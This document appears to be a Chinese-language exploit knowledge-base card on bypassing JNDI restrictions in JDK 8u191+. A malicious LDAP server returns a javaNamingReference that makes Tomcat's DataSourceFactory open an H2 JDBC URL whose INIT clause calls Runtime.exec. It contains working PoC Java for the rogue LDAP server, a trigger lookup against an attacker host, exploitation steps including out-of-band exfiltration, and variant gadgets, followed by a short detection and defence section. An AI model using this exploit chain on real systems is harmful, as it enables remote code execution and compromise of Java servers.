---
id: web-java-deserialization-jndi-ldap-local-factory-h2-init-rce
title: LDAP JNDI 高版本绕过：javaNamingReference 本地工厂 + Tomcat DataSourceFactory 触发 H2 INIT RCE
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-ldap-local-factory-h2-init
aliases:
- LDAP 打本地工厂类
- javaNamingReference 绕过
- Tomcat DataSourceFactory
- org.apache.tomcat.jdbc.pool.DataSourceFactory
- LDAP JNDI 高版本绕过
- H2 INIT RCE
tags:
- java
- jndi
- ldap
- local-factory
- tomcat-jdbc
- h2
- jdbc
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:56:41+08:00'
  notes: 已对照原文与15张图核对：decodeObject 三分支(serializedData 被 isSerialDataAllowed 拦截/remoteLocation/decodeReference)，decodeReference 无序列化限制且由 javaClassName+javaFactory+javaReferenceAddress 构造 Reference；getObjectFactoryFromReference 优先本地 loadClass，ObjectFactoriesFilter 校验；DataSourceFactory.getObjectInstance 读取属性并 createDataSource 触发 H2 连接，图15 显示 H2 INIT 执行 calc。卡片的 javaNamingReference 属性名、工厂类、H2 URL 与原文一致。未在本机复现；无 sources/source_url。
---

## 一句话结论

JDK 8u191+ 默认禁止 LDAP 远程 codebase 与序列化数据后，仍可走 `javaNamingReference` 的 `decodeReference` 分支：LDAP 响应里的 `javaFactory` 指定一个**本地 classpath 已有**的 `ObjectFactory`（如 Tomcat JDBC 连接池的 `org.apache.tomcat.jdbc.pool.DataSourceFactory`），JNDI 从本地加载工厂，工厂再用 `javaReferenceAddress` 里的 H2 JDBC URL 建连，`INIT=CREATE ALIAS` 执行 Java 代码，完成 RCE。

## 原理

- LDAP 的 `com.sun.jndi.ldap.Obj.decodeObject(Attributes)` 有三个分支：
  1. `javaSerializedData`：反序列化数据；高版本 `VersionHelper.isSerialDataAllowed()` 为 false，直接抛 `Object deserialization is not allowed`；
  2. `javaRemoteLocation`：`decodeRmiObject` 构造 Reference，但远程 codebase 受 `trustURLCodebase` 限制；
  3. `objectClass` 含 `javaNamingReference`：调用 `decodeReference(attrs, codebases)`，该分支没有序列化数据限制。
- `decodeReference` 从属性中读取 `javaClassName`、`javaFactory`、`javaReferenceAddress`（格式 `/index/type/value`，如 `/0/url/<jdbcUrl>`），构造 `javax.naming.Reference`；`javaFactory` 即工厂类名，classFactoryLocation 为空。
- 后续 `DirectoryManager.getObjectInstance()` → `getObjectFactoryFromReference(ref, factoryName)`：先 `helper.loadClass(factoryName)` 从**本地 classpath** 加载，只有本地找不到且 `ref.getFactoryClassLocation() != null` 时才从远程 codebase 加载。选用本地工厂类即可完全避开远程类加载限制。
- 新版 JDK 会在本地加载后调用 `ObjectFactoriesFilter.canInstantiateObjectsFactory(clas)` 检查；默认策略允许常规 `ObjectFactory` 实现，`DataSourceFactory` 实现了 `javax.naming.spi.ObjectFactory`，可通过（若部署方配置了更严格的工厂过滤则会拦截）。
- `org.apache.tomcat.jdbc.pool.DataSourceFactory.getObjectInstance()` 校验 `ref.getClassName()` 为 `javax.sql.DataSource`/`XADataSource`/`DataSource`，把 `ALL_PROPERTIES` 对应的 RefAddr 读入 Properties，`createDataSource()` 中 `new DataSource(poolProperties).createPool()` 触发 JDBC 驱动连接。
- JDBC URL 使用 H2 的 `INIT` 参数：`jdbc:h2:mem:testdb;...;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "1";};CALL EXEC('calc')`。H2 解析 INIT 后创建别名并调用，执行任意 Java 代码；`driverClassName=org.h2.Driver` 使 DataSource 使用 H2 驱动。

## 触发条件

- 目标 JDK 为 8u191+（LDAP 远程 codebase/序列化数据默认被禁）；
- 存在可被用户影响的 JNDI `InitialContext.lookup()`（LDAP 入口）；
- 目标 classpath 含 Tomcat JDBC 连接池（`tomcat-jdbc`，提供 `org.apache.tomcat.jdbc.pool.DataSourceFactory`）与可执行 INIT 的 H2 驱动（如 1.4.200）；
- 新版 JDK 的 `ObjectFactoriesFilter` 未禁止该工厂类；
- 攻击者可运行返回 `javaNamingReference` 属性的 LDAP 服务，受害者可出网访问 LDAP 端口。

## 利用步骤

1. 确认 JNDI 入口接受 `ldap://` 地址，且目标为高版本 JDK。
2. 起恶意 LDAP 服务，对查询返回 Entry：
   - `objectClass=javaNamingReference`；
   - `javaClassName=javax.sql.DataSource`；
   - `javaFactory=org.apache.tomcat.jdbc.pool.DataSourceFactory`；
   - `javaReferenceAddress` 填入 url/driverClassName/username/password/initialSize。
3. `url` 用 H2 JDBC URL，`INIT` 里 `CREATE ALIAS` + `CALL` 执行命令。
4. 触发 `lookup("ldap://attacker:1111/...")`；JNDI 本地加载工厂 → DataSourceFactory → H2 连接 → 命令执行。
5. 无回显时用 DNS/HTTP 外带或写文件。

## PoC

恶意 LDAP 服务（UnboundID，返回 javaNamingReference）：

```java
Entry e = new Entry(searchResult.getRequest().getBaseDN());
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaClassName", "javax.sql.DataSource");
e.addAttribute("javaFactory", "org.apache.tomcat.jdbc.pool.DataSourceFactory");

String jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;"
    + "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException "
    + "{Runtime.getRuntime().exec(cmd);return \"1\";}';CALL EXEC ('calc')";

e.addAttribute("javaReferenceAddress", new String[]{
    "/0/url/" + jdbcUrl,
    "/1/driverClassName/org.h2.Driver",
    "/2/username/Squirt1e",
    "/3/password/Squirt1e",
    "/4/initialSize/1"
});
searchResult.sendSearchEntry(e);
searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

触发：

```java
new InitialContext().lookup("ldap://attacker:1111/1");
```

关键调用链：

```text
DirectoryManager.getObjectInstance
→ getObjectFactoryFromReference（本地 loadClass DataSourceFactory）
→ DataSourceFactory.getObjectInstance
→ createDataSource → new DataSource(poolProperties).createPool()
→ H2 Driver 解析 INIT → CREATE ALIAS / CALL → Runtime.exec
```

## 变体与关联

- 本地工厂可替换：Tomcat `org.apache.naming.factory.ResourceFactory`/`BeanFactory`、其他中间件自带的 `ObjectFactory`；只要能通过 `ObjectFactoriesFilter` 且 `getObjectInstance` 可被 Reference 属性驱动。
- JDBC 驱动可替换：MySQL `autoDeserialize`/`ServerStatusDiffInterceptor`、PostgreSQL `socketFactory` XML、H2 `INIT` 等；本卡与 RMI 版 `web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass` 互补（LDAP `decodeReference` vs RMI `ReferenceWrapper`）。
- 低版本对照：`trustURLCodebase=true` 时可走远程 codebase；`isSerialDataAllowed=true` 时可走 `javaSerializedData` 反序列化。
- 关联：H2 JDBC INIT 卡片、JNDI/LDAP 注入基础、Tomcat JDBC 连接池。

## 检测与防御

- 禁止不可信 JNDI lookup；对 lookup 的协议/地址做白名单，只允许必要 LDAP 且校验返回数据。
- 高版本保持 `com.sun.jndi.ldap.object.trustURLCodebase=false` 与 `com.sun.jndi.ldap.object.trustSerialData=false`；但这不能阻止本地工厂分支，仍需应用层限制。
- 用 `ObjectFactoriesFilter`/`jdk.jndi.object.factoriesFilter` 拒绝 `org.apache.tomcat.jdbc.pool.DataSourceFactory`、`org.apache.naming.factory.*` 等工厂类；移除或隔离 tomcat-jdbc、H2 等不必要依赖。
- JDBC URL 不允许外部可控；禁用 H2 `INIT`/`CREATE ALIAS`（升级 H2 2.x 并限制初始化参数），限制驱动类白名单。
- 网络层阻断出站 LDAP/RMI/JDBC 到非受信地址；监控 LDAP 返回 `javaNamingReference`、`javaFactory` 指向 JDBC/命名工厂的流量。
- 日志/IDS 检测 lookup 目标为外部 IP、LDAP 响应含 `javaReferenceAddress`、随后 JVM 连接异常端口或执行子进程。
